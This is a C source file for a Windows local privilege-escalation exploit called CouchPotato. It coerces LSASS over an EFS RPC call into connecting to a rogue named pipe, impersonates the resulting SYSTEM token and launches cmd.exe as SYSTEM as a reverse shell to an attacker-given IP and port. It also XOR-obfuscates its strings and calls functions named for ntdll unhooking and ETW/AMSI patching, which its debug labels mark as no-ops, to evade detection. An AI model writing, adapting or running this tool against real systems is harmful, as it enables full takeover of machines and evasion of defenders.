#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <rpc.h>
#include <stdio.h>
#include <stdlib.h>
#include "couch_efsr_h.h"
#include "util.h"
#include <winsock2.h>

// --- debug helpers (additive, do not change behaviour) -----------------
static void __cdecl dbg(const char* fmt, ...) {
    char buf[1024];
    va_list ap; va_start(ap, fmt);
    int n = _vsnprintf_s(buf, sizeof(buf), _TRUNCATE, fmt, ap);
    va_end(ap);
    if (n < 0) n = 0;
    fflush(stdout);
    fputs(buf, stdout);
    fputs("\n", stdout);
    fflush(stdout);
    OutputDebugStringA(buf);
    OutputDebugStringA("\n");
}
#define DBG(...) do { dbg("[DBG %s:%d] ", __FILE__, __LINE__); dbg(__VA_ARGS__); } while(0)

static LONG WINAPI CrashHandler(EXCEPTION_POINTERS* ep) {
    char buf[512];
    DWORD code = ep ? ep->ExceptionRecord->ExceptionCode : 0;
    PVOID addr = ep ? ep->ExceptionRecord->ExceptionAddress : NULL;
    PVOID rip  = (ep && ep->ContextRecord) ? (PVOID)ep->ContextRecord->Rip : NULL;
    _snprintf_s(buf, sizeof(buf), _TRUNCATE,
        "[CRASH] code=0x%lX addr=%p rip=%p thread=%lu",
        code, addr, rip, GetCurrentThreadId());
    OutputDebugStringA(buf);
    OutputDebugStringA("\n");
    fputs(buf, stderr);
    fputs("\n", stderr);
    fflush(stderr);
    return EXCEPTION_EXECUTE_HANDLER;
}
// -----------------------------------------------------------------------

void* __RPC_USER MIDL_user_allocate(size_t n) {
    return HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, n);
}
void __RPC_USER MIDL_user_free(void* p) {
    if (p) HeapFree(GetProcessHeap(), 0, p);
}
void __RPC_USER PEXIMPORT_CONTEXT_HANDLE_rundown(
    PEXIMPORT_CONTEXT_HANDLE ctx) {
    (void)ctx;
}

static handle_t couch_bind(void) {
    RPC_STATUS st;
    RPC_WSTR sb = NULL;
    handle_t bh = NULL;

    // key changes every compile — derived from build timestamp
    const unsigned char _k = (unsigned char)(
        ((unsigned char)__TIME__[0] ^
            (unsigned char)__TIME__[3] ^
            (unsigned char)__TIME__[6]) | 1);

    // all wide strings XOR'd at compile time — no plaintext in .rdata
    // hardcoded length loops — null check fails when XOR'd zero is non-zero
    unsigned short _uuid[] = {
        L'd' ^ _k,L'f' ^ _k,L'1' ^ _k,L'9' ^ _k,L'4' ^ _k,L'1' ^ _k,L'c' ^ _k,L'5' ^ _k,
        L'-' ^ _k,L'f' ^ _k,L'e' ^ _k,L'8' ^ _k,L'9' ^ _k,L'-' ^ _k,L'4' ^ _k,L'e' ^ _k,
        L'7' ^ _k,L'9' ^ _k,L'-' ^ _k,L'b' ^ _k,L'f' ^ _k,L'1' ^ _k,L'0' ^ _k,L'-' ^ _k,
        L'4' ^ _k,L'6' ^ _k,L'3' ^ _k,L'6' ^ _k,L'5' ^ _k,L'7' ^ _k,L'a' ^ _k,L'c' ^ _k,
        L'f' ^ _k,L'4' ^ _k,L'4' ^ _k,L'd' ^ _k, 0
    };
    unsigned short _proto[] = {
        L'n' ^ _k,L'c' ^ _k,L'a' ^ _k,L'c' ^ _k,
        L'n' ^ _k,L'_' ^ _k,L'n' ^ _k,L'p' ^ _k, 0
    };
    unsigned short _host2[] = {
        L'\\' ^ _k,L'\\' ^ _k,L'l' ^ _k,L'o' ^ _k,L'c' ^ _k,
        L'a' ^ _k,L'l' ^ _k,L'h' ^ _k,L'o' ^ _k,L's' ^ _k,L't' ^ _k, 0
    };
    unsigned short _pipe[] = {
        L'\\' ^ _k,L'p' ^ _k,L'i' ^ _k,L'p' ^ _k,L'e' ^ _k,L'\\' ^ _k,
        L'e' ^ _k,L'f' ^ _k,L's' ^ _k,L'r' ^ _k,L'p' ^ _k,L'c' ^ _k, 0
    };
    unsigned short _host[] = {
        L'l' ^ _k,L'o' ^ _k,L'c' ^ _k,L'a' ^ _k,L'l' ^ _k,
        L'h' ^ _k,L'o' ^ _k,L's' ^ _k,L't' ^ _k, 0
    };

    // decrypt using hardcoded lengths — no null-terminator dependency
    for (int i = 0; i < 36; i++) _uuid[i] ^= _k;
    for (int i = 0; i < 8; i++) _proto[i] ^= _k;
    for (int i = 0; i < 11; i++) _host2[i] ^= _k;
    for (int i = 0; i < 12; i++) _pipe[i] ^= _k;
    for (int i = 0; i < 9; i++) _host[i] ^= _k;

    st = RpcStringBindingComposeW(
        (RPC_WSTR)_uuid,
        (RPC_WSTR)_proto,
        (RPC_WSTR)_host2,
        (RPC_WSTR)_pipe,
        NULL, &sb);
    if (st) { printf("[-] Compose: %ld\n", st); return NULL; }

    st = RpcBindingFromStringBindingW(sb, &bh);
    RpcStringFreeW(&sb);
    if (st) { printf("[-] FromString: %ld\n", st); return NULL; }

    st = RpcBindingSetAuthInfoW(bh,
        (RPC_WSTR)_host,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_AUTHN_GSS_NEGOTIATE,
        NULL, RPC_C_AUTHZ_NONE);
    if (st) { printf("[-] AuthInfo: %ld\n", st); RpcBindingFree(&bh); return NULL; }

    RpcBindingSetOption(bh, 12, 10000);
    DBG("couch_bind: returning bh=%p", bh);
    return bh;
}

DWORD WINAPI efs_trigger(LPVOID param) {
    DBG("efs_trigger: enter thread=%lu", GetCurrentThreadId());

    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCM) {
        SC_HANDLE hSvc = OpenServiceA(hSCM, "EFS", SERVICE_START | SERVICE_QUERY_STATUS);
        if (hSvc) {
            StartServiceA(hSvc, 0, NULL);
            Sleep(1000);
            CloseServiceHandle(hSvc);
        }
        CloseServiceHandle(hSCM);
    }
    DBG("efs_trigger: efs service touched");

    handle_t ht = couch_bind();
    if (!ht) { DBG("efs_trigger: couch_bind returned NULL"); return 1; }
    DBG("efs_trigger: bound, calling EfsRpcQueryUsersOnFile");

    long* pUsers = NULL;
    RpcTryExcept{
        long result = EfsRpcQueryUsersOnFile(
            ht,
            L"\\\\localhost/pipe/CouchPotato\\C$\\couch.txt",
            &pUsers
        );
        DBG("efs_trigger: EfsRpcQueryUsersOnFile result=%ld", result);
    }
        RpcExcept(EXCEPTION_EXECUTE_HANDLER) {
        DWORD code = RpcExceptionCode();
        DBG("efs_trigger: RPC exception code=0x%lX", code);
    }
    RpcEndExcept

        DBG("efs_trigger: free binding");
    RpcBindingFree(&ht);
    return 0;
}

VOID efs_escalate(char* ip, char* port) {
    __try {
    DBG("efs_escalate: enter ip=%s port=%s", ip, port);
    HANDLE hpipe = CreateNamedPipeA(
        "\\\\.\\pipe\\CouchPotato\\pipe\\srvsvc",
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES, 512, 512, NMPWAIT_WAIT_FOREVER, NULL);
    if (!hpipe || hpipe == INVALID_HANDLE_VALUE) {
        printf("[-] CreateNamedPipe: %lu\n", GetLastError()); return;
    }
    DBG("efs_escalate: pipe ready hpipe=%p", hpipe);

    HANDLE hThread = CreateThread(NULL, 0, efs_trigger, NULL, 0, NULL);
    if (!hThread) {
        printf("[-] CreateThread: %lu\n", GetLastError());
        CloseHandle(hpipe); return;
    }
    DBG("efs_escalate: trigger thread %lu started", GetThreadId(hThread));

    OVERLAPPED ov = { 0 };
    ov.hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
    ConnectNamedPipe(hpipe, &ov);

    DWORD w = WaitForSingleObject(ov.hEvent, 15000);
    DBG("efs_escalate: wait result=0x%08lX gle=%lu", w, GetLastError());
    WaitForSingleObject(hThread, 3000);
    CloseHandle(hThread);
    CloseHandle(ov.hEvent);

    if (w == WAIT_TIMEOUT) {
        printf("[-] Coercion failed\n");
        CloseHandle(hpipe); return;
    }
    printf("[+] LSASS connected\n");

    if (!ImpersonateNamedPipeClient(hpipe)) {
        printf("[-] ImpersonateNamedPipeClient: %lu\n", GetLastError());
        CloseHandle(hpipe); return;
    }
    printf("[+] Impersonating SYSTEM\n");

    HANDLE h_ex = NULL;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &h_ex)) {
        printf("[-] OpenThreadToken: %lu\n", GetLastError());
        RevertToSelf(); CloseHandle(hpipe); return;
    }
    DBG("efs_escalate: h_ex=%p", h_ex);

    HANDLE h_new = NULL;
    if (!DuplicateTokenEx(h_ex, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &h_new)) {
        printf("[-] DuplicateTokenEx: %lu\n", GetLastError());
        CloseHandle(h_ex); RevertToSelf(); CloseHandle(hpipe); return;
    }
    printf("[+] SYSTEM token duplicated\n");
    DBG("efs_escalate: h_new=%p", h_new);

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    struct sockaddr_in addr = { 0 };
    addr.sin_family = AF_INET;
    addr.sin_port = htons(atoi(port));
    addr.sin_addr.s_addr = inet_addr(ip);
    DBG("efs_escalate: connect -> ip=%s port=%d", ip, ntohs(addr.sin_port));
    int rc = connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    DBG("efs_escalate: connect rc=%d gle=%lu", rc, GetLastError());
    SetHandleInformation((HANDLE)sock, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);

    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi = { 0 };
    si.hStdInput = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError = (HANDLE)sock;
    si.dwFlags = STARTF_USESTDHANDLES;

    if (!CreateProcessAsUserW(h_new,
        L"C:\\Windows\\System32\\cmd.exe",
        NULL, NULL, NULL,
        TRUE,
        0, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcessAsUserW: %lu\n", GetLastError());
    }
    else {
        printf("[+] SYSTEM shell spawned\n");

        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    CloseHandle(h_new);
    CloseHandle(h_ex);
    closesocket(sock);
    WSACleanup();
    } __except (CrashHandler(GetExceptionInformation()), EXCEPTION_EXECUTE_HANDLER) {
        DBG("efs_escalate: EXCEPTION swallowed, exiting");
        return;
    }
}

int main(void) {
    // Force unbuffered stdout, install top-level crash handler
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    SetUnhandledExceptionFilter(CrashHandler);

    LPSTR cmd = GetCommandLineA();
    DBG("argc scan: cmd=[%s]", cmd);
    BOOL q = FALSE; DWORD p = 0;
    while (cmd[p]) {
        if (cmd[p] == '"') q = !q;
        if (cmd[p] == ' ' && !q) break;
        p++;
    }
    while (cmd[p] == ' ') p++;
    char* a = cmd + p;
    char* s = strchr(a, ' ');
    if (!a[0] || !s) { printf("Usage: CouchPotato.exe <ip> <port>\n"); return 1; }

    char ip[16] = { 0 }, port[6] = { 0 };
    strncpy(ip, a, s - a);
    strcpy(port, s + 1);
    DBG("parsed ip=[%s] port=[%s] ip_len=%lu", ip, port, (unsigned long)(s-a));

    __try {
        DBG(">> unhook_Ntdll (no-op)");
        unhook_Ntdll();
        DBG(">> EtwPatch (no-op)");
        EtwPatch();
        DBG(">> AmsiPatch (no-op)");
        AmsiPatch();
        DBG(">> efs_escalate");
        efs_escalate(ip, port);
        DBG(">> efs_escalate returned");
    } __except (CrashHandler(GetExceptionInformation()), EXCEPTION_EXECUTE_HANDLER) {
        DBG("EXCEPTION swallowed, exiting");
        return 99;
    }

    return 0;
}